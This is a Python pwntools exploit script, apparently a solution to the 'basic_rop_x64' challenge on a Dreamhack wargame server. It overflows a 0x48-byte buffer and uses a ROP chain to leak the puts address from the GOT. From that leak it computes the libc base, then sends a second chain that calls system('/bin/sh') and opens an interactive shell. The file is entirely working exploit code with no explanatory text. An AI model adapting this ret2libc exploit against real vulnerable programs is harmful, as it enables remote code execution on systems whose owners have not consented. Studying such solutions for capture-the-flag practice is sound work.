from pwn import*
context.arch="amd64"
context.log_level = 'debug'

host = 'host3.dreamhack.games'
port = 13726
r = remote(host,port)
#r = process('./basic_rop_x64')

elf = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

# rdx gadget is no set!
pop_rsi_r15_ret = 0x400881
pop_rdi = 0x400883

puts_plt = 0x4005c0
puts_got = 0x601018
read_plt = 0x4005f0
raed_got = 0x601030
main_plt = 0x4007ba

payload = ''
payload += 'A'*0x48
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_plt)

r.send(payload)

r.recv(0x40)
puts_addr = u64(r.recv(6) + "\x00\x00")
log.info('[+] puts_got = '+hex(puts_addr))

libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search("/bin/sh"))

log.info('[+] libc_base = '+hex(libc_base))
log.info('[+] system = '+hex(system))
log.info('[+] /bin/sh = '+hex(binsh))

payload2 = 'A'*0x48
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)

r.sendline(payload2)
r.interactive()

